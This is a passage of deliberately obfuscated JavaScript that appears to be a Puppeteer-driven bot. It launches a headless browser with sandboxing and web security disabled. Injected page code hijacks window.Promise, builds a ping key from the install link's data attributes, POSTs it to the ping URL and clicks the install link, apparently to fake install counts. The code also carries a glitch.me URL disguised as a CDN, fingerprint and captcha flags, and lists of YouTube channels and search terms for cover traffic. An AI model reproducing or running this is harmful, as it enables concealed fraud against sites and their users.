                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x2539 + 0x17b * -0x4 + -0x1f0d ? (this['block'] = P[-0xc2a * -0x2 + 0xd95 + -0x25d9], this['start'] = N - (0x5b * 0x26 + 0x78e * 0x4 + -0x2b7a), this['hash'](), this['hashed'] = 0x376 + -0x63 + -0x312) : this['start'] = N;
                }
                return this['bytes'] > -0xa5cf * 0x1ae59 + -0x1319 * -0xc5fe7 + 0x12a67d467 && (this['hBytes'] += this['bytes'] / (0x1243fa73c + 0x4fb8b4fc + -0x73f85c38) << -0x1 * 0xed5 + 0x98b + 0x2 * 0x2a5, this['bytes'] = this['bytes'] % (0x483051 * -0x48c + 0x79abe144 + 0x1ce8fcf08)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x1367 * -0x2 + 0x66b * -0x2 + -0x33a5 * -0x1;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0xeb5 * -0x2 + -0x1ba * -0xd + -0x33cc] = this['block'], J[K >> -0x89 * 0x1f + -0x2560 + 0x35f9] |= x[0x4 * 0x182 + 0x1440 + -0x10d * 0x19 & K], this['block'] = J[0x1fd3 + -0x17 * 0x38 + 0x3 * -0x8e9], K >= -0x405 + -0x21d3 * 0x1 + 0x15 * 0x1d0 && (this['hashed'] || this['hash'](), J[-0x4 * -0x137 + 0x19cf * 0x1 + 0x1 * -0x1eab] = this['block'], J[0x1e1f + 0x247b * 0x1 + -0x428a] = J[0x17b3 * 0x1 + 0x1b1d + 0x32cf * -0x1] = J[-0x4f * -0x2f + 0xe5 * -0x2 + -0xcb5 * 0x1] = J[0x16f2 + -0x1295 + 0x1 * -0x45a] = J[-0x10b3 + 0x64d * -0x2 + -0x5f * -0x4f] = J[-0xb * 0x283 + 0xe3 * 0x1d + 0x1ef] = J[0x197b * 0x1 + -0x1fdd * 0x1 + -0x28 * -0x29] = J[-0x11d9 * -0x1 + -0x1045 + -0x18d] = J[0x549 * -0x3 + -0x2300 + 0x32e3] = J[0x15ef + 0x1b91 * 0x1 + -0x15 * 0x25b] = J[0x252a + -0x738 + -0x1de8] = J[-0xb * 0x22f + -0x94e + -0x1 * -0x215e] = J[-0x78c + 0xf0d + -0x775] = J[-0x79 * -0x34 + -0xf5d * -0x1 + 0x4a * -0x8a] = J[0xc03 + 0x1 * -0x2033 + 0x143e] = J[0x93a + 0xfc5 + -0x18f0] = -0x1f * 0x2b + -0x4c7 * -0x2 + -0x459), J[0x1900 + -0x17c5 + 0x1 * -0x12d] = this['hBytes'] << -0xba7 + 0x26a3 + -0x565 * 0x5 | this['bytes'] >>> 0x3 * -0x78b + -0x17b5 * -0x1 + -0xf7, J[0xcb + 0x1e69 + -0x1f25] = this['bytes'] << -0xdc6 + -0x23d0 + 0x3199, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x25cb + -0x24bb * -0x1 + 0x120; J < -0x130a + 0x15 * -0x165 + 0x30a3 * 0x1; ++J)
                K = Q[J - (0x4f7 + 0x1 * 0x11f1 + -0x16e5)] ^ Q[J - (0x10e0 + 0x1e * 0x86 + -0x208c)] ^ Q[J - (0x55e + 0x229f + -0x27ef)] ^ Q[J - (-0x49 + -0x22db + 0x2334)], Q[J] = K << 0x1c9b + -0x19 * -0x8b + -0x1 * 0x2a2d | K >>> 0x1b5a + 0x3b0 + -0x1eeb;
              for (J = 0x670 + 0x1 * 0x71 + -0x6e1; J < -0x269f + -0x1ba1 + -0x6 * -0xb0e; J += 0x1d * 0xcb + 0xf * -0x181 + -0x6b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1a * -0x1 + 0x2319 + -0x232e | L >>> 0x22d + -0x23f + 0x5 * 0x9) + (M & N | ~M & O) + P + (-0xa483a39 * -0xd + 0x5f290413 + -0xb7 * 0xc17e99) + Q[J] << -0x52 * -0x35 + 0x1 * -0x2177 + 0x1d5 * 0x9) << 0x2e9 * 0x1 + -0x1 * 0x102b + 0xd47 | P >>> 0xd * -0x20b + -0x3b5 + 0x1e5f * 0x1) + (L & (M = M << -0x12c + -0x8 * 0x4e1 + 0x2852 | M >>> 0x15a4 + -0x64f + -0xf53) | ~L & N) + O + (-0x2 * -0x7d54d97 + 0x5f9 * -0xa5245 + 0x887d3c88) + Q[J + (-0x1 * 0x2589 + -0x75c + 0x2ce6)] << 0x4da + -0x1619 + 0x5 * 0x373) << -0xfba + 0x666 + 0x1 * 0x959 | O >>> -0x25d2 + 0x2 * 0xed3 + 0x847) + (P & (L = L << -0xd3 * 0x1a + -0x3be + -0x2 * -0xca5 | L >>> -0x47 * 0x17 + -0x16bd * 0x1 + -0x4 * -0x748) | ~P & M) + N + (0xa393d7f8 + -0x7af8a6d9 + 0x31e7487a) + Q[J + (0x34 * -0x71 + -0x43c + 0x2 * 0xd99)] << 0x1 * 0x125f + -0x10e2 + 0x7f * -0x3) << 0x802 + -0x20cc + 0x3 * 0x845 | N >>> -0x20b2 + 0x3 * -0x713 + 0x3606) + (O & (P = P << 0x137c + 0x2 * 0xc0e + -0x2b7a | P >>> 0x1d89 + -0x119 * -0x4 + 0x1c9 * -0x13) | ~O & L) + M + (-0x3f * 0x835d45 + -0x1 * -0x16e6ffdd + 0x63ef6db7) + Q[J + (-0x371 + 0xb3 * -0x2e + 0xc2 * 0x2f)] << 0x3f1 * -0x1 + -0x7 * 0x4c1 + 0x2538) << 0x2060 + -0x63f * 0x5 + -0x120 | M >>> -0x8b2 + -0x1044 + -0x17 * -0x117) + (N & (O = O << 0xffa + 0xc37 * 0x2 + -0x1 * 0x284a | O >>> -0x39 * 0x9a + 0x134d + 0x15d * 0xb) | ~N & P) + L + (-0x1 * 0x17429516 + -0x8367c24 + 0x79fb8ad3) + Q[J + (0x672 + 0x61f * -0x1 + 0x1 * -0x4f)] << 0x56 * 0x4b + -0x1 * -0xe96 + 0x13 * -0x218, N = N << 0x19 * -0xdf + 0x16f * 0xd + -0x1 * -0x342 | N >>> 0x20c0 + -0x8cb * 0x2 + -0xf28;
              for (; J < 0x1c3d + -0xb61 + -0x85a * 0x2; J += 0xd1 * 0x3 + 0x5 * -0x20b + 0x7c9)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x4 * 0x728 + -0x1 * 0x166f + 0x1d3 * 0x1c | L >>> 0xc24 + 0x1 * 0x229d + -0x2ea6 * 0x1) + (M ^ N ^ O) + P + (0x99f0dd03 + -0xf932c2d + -0xb * 0x28057bf) + Q[J] << -0x20 * -0x9 + -0x174 * -0x9 + 0x65 * -0x24) << 0x425 + -0x406 * 0x3 + 0x7f2 | P >>> -0x12 * -0xf9 + 0x4ab + 0xb09 * -0x2) + (L ^ (M = M << -0x348 + 0x31 + -0x1 * -0x335 | M >>> 0xede + -0x35d + -0xb7f) ^ N) + O + (-0xd72a3f63 * 0x1 + 0xcc06c987 + 0x79fd617d) + Q[J + (0x82c + -0x2f7 * -0x1 + -0xf * 0xbe)] << 0x773 + 0x7d3 + -0x55 * 0x2e) << 0x1 * 0x247 + 0x9d2 + -0xc14 | O >>> 0x521 + 0x3d6 * 0x1 + -0x8dc) + (P ^ (L = L << 0x58f + 0xca0 + -0x1211 | L >>> -0xe2f + -0x2075 * -0x1 + -0x1244) ^ M) + N + (0x85af07b + -0xcc01d5a7 + 0x13280d0cd) + Q[J + (0x7 * 0xdb + -0x2527 * 0x1 + 0x63c * 0x5)] << -0x5 * 0x26b + -0x2 * -0xcb3 + 0x1 * -0xd4f) << 0x1b81 + -0x3a * -0xa9 + -0x20e3 * 0x2 | N >>> -0x60a + -0x1eb3 + 0x106 * 0x24) + (O ^ (P = P << -0x173c + -0x1 * 0x2015 + 0x376f | P >>> 0x7 * 0x3e5 + -0x24ec + 0xf * 0xa5) ^ L) + M + (0x596ddb21 + -0x3 * -0x172a18e5 + 0x30123a2f * -0x1) + Q[J + (0x8af + -0x16ed + 0xe41)] << -0x3cb + -0x59 + -0x6a * -0xa) << 0x3b8 + 0xa * 0x226 + -0x192f | M >>> 0x542 * 0x2 + -0x12b1 + 0x848) + (N ^ (O = O << 0xe88 + -0x1 * -0x30d + -0x11 * 0x107 | O >>> -0x1 * 0x1af5 + 0x1924 + 0x1 * 0x1d3) ^ P) + L + (-0xd317253d + -0x4031a6f3 * -0x3 + -0xd2583 * -0x9d7) + Q[J + (0x2415 + 0x22ba + -0x46cb * 0x1)] << 0xef6 * 0x2 + 0x1549 * 0x1 + -0x3335 * 0x1, N = N << -0xf26 + 0x61 + 0xee3 | N >>> -0x2 * 0x6e9 + -0x1855 + 0x2629;
              for (; J < 0x487 * -0x5 + -0x398 + 0x1a77; J += 0x2f * 0xa0 + -0x6c5 + -0x1696)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x240d + 0x2 * 0xac + -0x2560 | L >>> -0x26c0 + 0x1e68 + -0x135 * -0x7) + (M & N | M & O | N & O) + P - (-0x5c81c1c7 * -0x1 + -0x3abd51a5 + 0x4f1fd302) + Q[J] << 0x1455 + 0x51a * 0x6 + -0x32f1 * 0x1) << 0x2d3 + 0x159b * -0x1 + 0x12cd * 0x1 | P >>> -0xfd3 * -0x1 + 0x1 * -0x103a + -0x5 * -0x1a) + (L & (M = M << -0x17 * -0x141 + -0xc * -0x137 + -0x2b4d | M >>> 0x1183 * 0x1 + 0x1838 + -0x29b9) | L & N | M & N) + O - (-0x1 * -0x35e12874 + 0x1 * -0x283f73e5 + 0x63428e95) + Q[J + (0xb6 + -0xa03 + -0x18d * -0x6)] << 0x373 * -0x6 + 0x10a0 + 0x412) << -0xaa3 * 0x2 + 0x22fa + 0x1f * -0x71 | O >>> 0x11dc + 0x1240 + -0x2401) + (P & (L = L << -0x19f8 + 0x8 * 0xb4 + 0x1476 | L >>> 0x7 + 0x1906 + -0x190b) | P & M | L & M) + N - (0xa085ab28 + -0x58fbabf1 + 0x295a43ed) + Q[J + (0x1988 * -0x1 + -0x19 * -0x123 + -0xb * 0x43)] << -0x148d + -0x1e5f + 0x32ec) << 0x122c + -0x2546 + 0x131f | N >>> 0xb92 * -0x1 + -0x1 * -0x26f + 0xd * 0xb6) + (O & (P = P << -0x2473 + 0x78d * 0x3 + 0xdea | P >>> -0xfb3 + 0x470 + 0x5 * 0x241) | O & L | P & L) + M - (0xc87eb5bf + 0xb6fe95bc + -0x10e990857) + Q[J + (0x7 * -0x33a + 0x1780 + -0xe7)] << -0xe * -0x2b4 + 0x1 * -0x26a2 + 0x1 * 0xca) << -0xfc5 + 0xd * 0x25f + 0x1 * -0xf09 | M >>> -0x2 * -0x355 + 0x877 + -0xf06) + (N & (O = O << 0x1759 * 0x1 + -0xe37 + -0x904 | O >>> -0x297 + 0x2 * -0xfe7 + -0x2267 * -0x1) | N & P | O & P) + L - (0x1e7c3d96 + 0x7b6cabb * 0x3 + 0x3 * 0x13c1371f) + Q[J + (-0x1 * 0x241f + -0x15 * 0x1a + 0x2645)] << 0x874 + -0x4f + -0x825, N = N << -0x7 * -0x565 + -0x16e + -0x2437 | N >>> 0xe * 0x10 + 0x13f2 * -0x1 + 0x1314;
              for (; J < -0x36a + 0x3b3 * -0x9 + 0x2505; J += 0x13fe + 0x644 + -0x1a3d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x15cc + -0x211f + 0x36f0 | L >>> 0x51 * -0x43 + 0xf * -0x16e + 0x2ac0) + (M ^ N ^ O) + P - (-0x452f195 + -0x25c11052 * -0x1 + 0x142f1f6d) + Q[J] << 0x1 * 0x19df + 0x14f * -0x3 + 0x15f2 * -0x1) << -0x104e + -0xc * -0x4c + 0x1 * 0xcc3 | P >>> 0x21cb + 0x321 * -0xb + 0xb * 0x11) + (L ^ (M = M << 0x212b + -0xba6 + -0x1567 * 0x1 | M >>> -0xd3b + -0xaf + -0x4 * -0x37b) ^ N) + O - (-0x1d0b79dc * -0x1 + 0x3a9e867b + -0x220cc22d) + Q[J + (-0xae8 + -0x1385 * 0x2 + 0x31f3 * 0x1)] << 0x1 * 0x48b + -0x17e6 + 0x135b) << -0xc5 * -0x10 + 0x2 * -0xf9 + 0x1 * -0xa59 | O >>> -0x1 * 0x1a1e + 0x683 + -0x9db * -0x2) + (P ^ (L = L << -0x1 * -0x1478 + -0x184a * -0x1 + 0xb29 * -0x4 | L >>> 0x13c3 * 0x1 + -0x2d5 * -0xb + -0x21f * 0x18) ^ M) + N - (0x1023ef3a * 0x3 + -0x222c6c2d + -0x7 * -0x59fb1cf) + Q[J + (-0xffe + -0x1b1d + 0x2b1d)] << 0x56 + 0x1cf4 + -0x1d4a) << -0x992 + -0xfae + -0x1 * -0x1945 | N >>> -0x1 * -0x2e6 + 0x1cff * 0x1 + -0x139 * 0x1a) + (O ^ (P = P << 0x342 + 0xa * 0x25c + -0x1abc | P >>> 0x802 + -0x1c3 * 0x13 + 0x1979 * 0x1) ^ L) + M - (-0x1 * 0x5103cd30 + -0x156471ea + 0x9c057d44) + Q[J + (0x11 * 0xe9 + -0x2527 + -0x73b * -0x3)] << -0x2ca + 0x13d * 0x1 + 0x18d) << 0x29 * -0x4d + -0x59 * 0x2 + 0xd0c | M >>> 0x587 + 0x2f1 * -0x2 + 0x1 * 0x76) + (N ^ (O = O << 0x966 * 0x1 + -0x1cfc + 0x13b4 | O >>> -0x47 * -0x2e + 0xa3 * -0x3a + 0x182e) ^ P) + L - (-0x5f94123f + 0x2f * 0x144feb + 0x9176a444) + Q[J + (-0x3 * 0x176 + 0x11aa + -0xd44)] << 0x3 * 0xb57 + -0x1f * -0x9a + -0x34ab, N = N << 0x4 * 0x3fe + 0x12c6 + 0x454 * -0x8 | N >>> -0x17 * 0xcf + -0x11 * -0x83 + 0x9e8;
              this['h0'] = this['h0'] + L << 0xdf * -0xd + -0x3b * 0xa6 + 0x3195, this['h1'] = this['h1'] + M << 0x247b + 0x11a1 + -0x1b0e * 0x2, this['h2'] = this['h2'] + N << -0xb * 0x1f1 + 0x3d * 0x3 + 0x2 * 0xa52, this['h3'] = this['h3'] + O << 0x4 * 0x62f + -0xc1 * 0x1b + -0x461, this['h4'] = this['h4'] + P << -0x1bd0 + 0x2e * -0xcc + 0x4078;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x12c8 + 0x2ec * -0x7 + 0x1c8 & -0x144d + -0x1c6a + 0x30c6] + w[J >> 0x2d5 + -0xee9 * 0x1 + 0xc2c & -0xf85 + -0x1e2 + 0x1176] + w[J >> -0x2219 + 0x1 * 0x21ef + 0x3e & 0x39a * 0x1 + 0xa1a + -0xda5] + w[J >> 0x1 * 0x1ec5 + -0x1 * 0x28c + 0x963 * -0x3 & -0x1948 + -0x24f7 + 0x3e4e] + w[J >> 0x148a + -0x1 * 0x254d + 0x14b * 0xd & -0xaa7 + -0xf41 + -0x19f7 * -0x1] + w[J >> 0x1bc7 + -0x3 * -0xa31 + -0x3a52 & 0x20a + -0x12c * 0x6 + 0x50d * 0x1] + w[J >> -0x19dc + 0x1 * -0x18ff + 0x32df & -0x76 * -0x50 + -0x2415 + -0xbc] + w[-0x2a2 * 0x6 + 0xd * 0x223 + 0x2 * -0x5f6 & J] + w[K >> 0x2 * 0x22f + -0x2 * -0x265 + -0x90c & -0x1aa6 + -0x51 * -0x26 + 0xeaf] + w[K >> 0x442 + -0x1529 + 0x1 * 0x10ff & -0x25 * 0xd3 + -0x1d * -0x35 + -0x1a3 * -0xf] + w[K >> -0x2239 * -0x1 + 0x130a + -0x352f & -0x1 * -0x1ae4 + -0xdbe + -0xd17 * 0x1] + w[K >> -0x16a1 * 0x1 + 0x18e * 0x14 + 0x867 * -0x1 & -0xac * -0x3 + 0x14d7 + -0x16cc] + w[K >> -0x2f * -0x1d + -0xb7d + 0x1 * 0x636 & 0x371 * -0x7 + -0x188e + -0x30b4 * -0x1] + w[K >> -0x1b80 + 0x255a + 0x1a3 * -0x6 & -0xec0 + 0x2641 + -0x1772] + w[K >> -0xe4f + -0x14 * -0x67 + 0x647 & -0x117c + -0xaff + 0x1c8a] + w[-0xca7 + 0x5d0 + -0x1 * -0x6e6 & K] + w[L >> -0x109 + -0xb66 * 0x1 + 0xc8b & 0x1 * -0x23b5 + -0xbcc + -0x2f9 * -0x10] + w[L >> 0x5d5 + 0xf5f + 0x2 * -0xa8e & 0x1 * -0x8aa + 0x1a00 + -0x1 * 0x1147] + w[L >> -0x1 * 0x2687 + -0x1a31 + 0x40cc & 0x1dc7 + 0x629 + -0x23e1] + w[L >> 0x1 * 0x1b16 + -0x2 * 0x48b + 0x11f * -0x10 & 0x1ae0 + 0xa * 0xd1 + 0x3e3 * -0x9] + w[L >> 0x1 * -0x1e55 + 0x1807 + -0x21e * -0x3 & -0x18a6 + 0x1f0f + -0x65a] + w[L >> -0x24db + -0x1de * -0x5 + 0x1b8d * 0x1 & -0x1b04 + -0x1d62 + 0x3875] + w[L >> 0xd1b + -0x1095 + 0x37e & 0x7d8 + 0x1a1d + 0x21e6 * -0x1] + w[0x11a1 * -0x1 + -0x666 * 0x4 + -0xad2 * -0x4 & L] + w[M >> 0x5fb * 0x1 + 0x1b2 + -0x791 & 0x2356 + -0x6c7 * 0x3 + -0xef2] + w[M >> 0x301 * -0xd + -0x1 * -0x136d + 0x13b8 & 0x1e3e + 0xef8 + 0x1 * -0x2d27] + w[M >> 0x23d3 + -0x1 * 0x703 + -0x1cbc & 0xdc8 + 0x6 * 0x49d + -0x2967 * 0x1] + w[M >> 0xeec + 0x20ed * 0x1 + 0x2fc9 * -0x1 & 0x22d8 + -0xde9 * -0x1 + 0x1 * -0x30b2] + w[M >> -0x5fc + 0x3a6 + -0x5 * -0x7a & 0x29b * 0xd + 0x14 * 0x17c + 0x8 * -0x7f0] + w[M >> -0x8 * -0xb2 + 0x2279 + -0x2801 & 0x3 * 0x767 + 0xc2f * 0x1 + -0x2255] + w[M >> -0x1b3f + -0x1 * -0xef3 + -0x8 * -0x18a & 0x3 * 0x783 + 0x95 * -0x14 + -0x92 * 0x13] + w[-0x34 + -0x63c + 0x1 * 0x67f & M] + w[N >> 0x1aad + 0x413 * 0x2 + -0x22b7 & -0x2152 + 0x146a + 0xcf7] + w[N >> 0x1 * 0x25a5 + 0xd46 * -0x2 + 0x1 * -0xb01 & 0x1 * -0x2503 + -0x64e + -0x15b * -0x20] + w[N >> 0x2 * -0x487 + -0x1 * -0x195e + -0x103c & 0x88 * 0xc + 0x2 * -0x1005 + -0xf * -0x1b7] + w[N >> -0x2 * 0xff3 + -0x3a6 + 0x239c & 0x2 * -0x5d5 + 0x1 * -0xa07 + 0x15c0] + w[N >> -0x1 * -0x1d3b + -0x9a1 * 0x1 + -0x138e & 0x1f * -0x10f + -0x13 * -0x7f + 0x1773] + w[N >> 0x11d4 + 0x5cf + 0x1 * -0x179b & 0x16 * -0xbf + 0x51d * -0x1 + 0x399 * 0x6] + w[N >> -0x6 * -0x22d + 0x34d + -0x1057 & -0x202b * -0x1 + 0x18d4 + -0x38f0] + w[-0x4b5 * -0x5 + 0x1d4e + -0x34c8 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x25dd + 0x82e * -0x3 + 0x3e7f & -0x3fd + -0x1 * 0x19ff + -0x1efb * -0x1,
                J >> -0x20d9 + -0xf01 + 0x17f5 * 0x2 & -0xffd + -0xff4 + 0x8 * 0x41e,
                J >> 0x1 * -0x2549 + 0x175 * 0x5 + 0x1e08 & -0x1e79 + 0x150 + 0x14 * 0x182,
                0x1 * -0x349 + -0x2515 + -0x1 * -0x295d & J,
                K >> -0x244c * -0x1 + 0xdcd * 0x1 + -0x1 * 0x3201 & 0x1cb7 * -0x1 + 0x1e5d + -0xa7,
                K >> -0x1 * 0x62b + -0x174 + 0x7af & 0x11e9 + -0x31d * -0x5 + -0x207b,
                K >> -0x1094 + 0x1 * 0x161b + -0x15 * 0x43 & -0x6bb * 0x1 + 0x226d + 0x5 * -0x557,
                0x7c0 + 0x17c6 + 0x209 * -0xf & K,
                L >> 0x7a8 + -0xbf2 + 0x462 & -0x1a76 + 0x1243 + 0x499 * 0x2,
                L >> 0x178f + -0x1 * 0x406 + -0x1379 & 0x126d + -0xaf1 + -0x67d,
                L >> 0x1 * -0x1647 + 0x10fd * -0x2 + -0x1 * -0x3849 & -0x2138 + 0x609 + 0x1c2e,
                0x862 * -0x1 + -0x1d6 * 0x9 + 0x19e7 & L,
                M >> 0xbc * 0x1c + 0x235 + 0x2d * -0x81 & -0x4bb * -0x7 + -0x10f8 + 0x793 * -0x2,
                M >> 0x1 * 0x6c8 + 0x323 + -0x9db & 0x207 + -0x6f9 + 0xa9 * 0x9,
                M >> 0x839 + -0x22f0 + 0x1abf & -0x2 * -0xf98 + -0x1b1 * -0x11 + -0x3af2,
                -0x3a2 + 0xfe6 + -0xb45 & M,
                N >> -0xec3 + -0x9a * -0x34 + -0x106d & -0x28 + -0x1986 + -0x1aad * -0x1,
                N >> -0x4 * -0x759 + -0xe6f * 0x1 + -0x29 * 0x5d & -0xeef * -0x2 + -0xa * -0x15 + -0x1db1,
                N >> 0xcab + -0x7 * -0x22d + 0x94a * -0x3 & -0x1 * -0x1ea9 + 0x765 + -0x250f,
                0x213 * 0x8 + -0x886 + -0x713 * 0x1 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x7 * -0x343 + -0x3 * 0x79c + -0x1 * -0x13), (K = new DataView(J))['setUint32'](-0x1c18 + 0x3 * -0x841 + -0x7 * -0x78d, this['h0']), K['setUint32'](-0x22fd + -0x1 * 0x259b + -0x1 * -0x489c, this['h1']), K['setUint32'](-0xbb4 + -0x97c + -0x308 * -0x7, this['h2']), K['setUint32'](0xf * 0x267 + 0x7 * 0x295 + -0x3610, this['h3']), K['setUint32'](-0x135c + 0x854 + 0xb18 * 0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x24c5 + 0x164c + 0xe79];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x19ea + 0xfc8 + -0x1 * -0xa22;
            J[0x1 * 0xfb7 + -0x1 * 0x17a3 + 0xa9 * 0xc]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x21d1 + 0x11c2 * -0x1 + -0x100f] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x11ea + -0x13dd + 0x138 * 0x1f), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0xc39 * -0x1 + -0x2f * 0xb + -0xa33;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x950 + -0x13d2 + -0x2 * -0x117f), Promise['resolve'](0x1129 * 0x1 + -0x2 * -0xef + -0x1306);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x4 * -0x755 + 0x59 * 0x2d + -0x18d * 0x1d; j < -0x21da + 0x5 * 0x4fd + -0x8ea * -0x1; j++)
    i();
}
const NETWORK_PATIENCE = 0xeb * 0x42 + -0x338d + 0x1637 + (-0x1 * -0x1467 + 0xa9 * -0x5 + 0x1 * -0x562) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1e1 * 0x5 + -0xad * -0x11 + -0x215) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + Z(0x1a, 'e[LY') + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x32a + -0x1 * -0x1f15 + -0x1beb * 0x1; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + a0(0x3) + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push']((a0(0x1e) + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + a1(0x13) + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 